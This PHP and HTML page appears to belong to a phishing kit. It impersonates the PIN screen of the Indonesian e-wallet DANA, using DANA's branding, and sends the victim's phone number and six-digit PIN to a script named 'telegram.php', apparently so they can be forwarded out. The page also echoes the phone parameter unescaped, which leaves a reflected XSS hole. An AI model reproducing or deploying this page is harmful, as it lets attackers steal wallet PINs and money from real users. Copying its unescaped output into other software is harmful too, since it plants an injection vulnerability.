<?php
if (!isset($_GET['phone'])) {
    header("location:./");
}
?>

<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="refresh">
    <title>PIN DANA | dana.id</title>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <link rel="stylesheet" type="text/css" href="./pin.css">
    <link rel="stylesheet" type="text/css" href="./spinner.css">
</head>

<body>
    <div class="container">
        <a class="aback" href="./../no-hp.html"><img class="back" src="./back.png"></a>
        <img class="dana_logo" src="./dana_logo.png">
        <h1>Masukkan <b class="bh1">PIN DANA</b></h1>
        <div class="inputPin">
            <form class="formPin" action="./telegram.php" method="get">
                <input name="step" value="2" hidden>
                <input name="phone" value="<?= (isset($_GET['phone']) ? $_GET['phone'] : '') ?>" hidden>
                <div class="six_pin">
                    <input inputmode="numeric" id="pin1" maxlength="1" autocomplete="off" type="password" class="inpPin" name="pin1"></input>
                    <input inputmode="numeric" id="pin2" maxlength="1" autocomplete="off" type="password" class="inpPin" name="pin2"></input>
                    <input inputmode="numeric" id="pin3" maxlength="1" autocomplete="off" type="password" class="inpPin" name="pin3"></input>
                    <input inputmode="numeric" id="pin4" maxlength="1" autocomplete="off" type="password" class="inpPin" name="pin4"></input>
                    <input inputmode="numeric" id="pin5" maxlength="1" autocomplete="off" type="password" class="inpPin" name="pin5"></input>
                    <input inputmode="numeric" id="pin6" maxlength="1" autocomplete="off" type="password" class="inpPin" name="pin6"></input>
                </div>

            </form>
            <div class="btn">
                <button id="see" class="see">TAMPILKAN</button>
                <a class="lupa" href="#">LUPA PIN?</a>
            </div>
        </div>
    </div>
    <div id="process" name="process" class="process" style="display: none;">
        <div class="loading">
            <img src="./load_bg.png">
            <img class="spinner" src="./load_spin.png">
        </div>
    </div>
</body>
<script src="./function_pin.js"></script>

</html>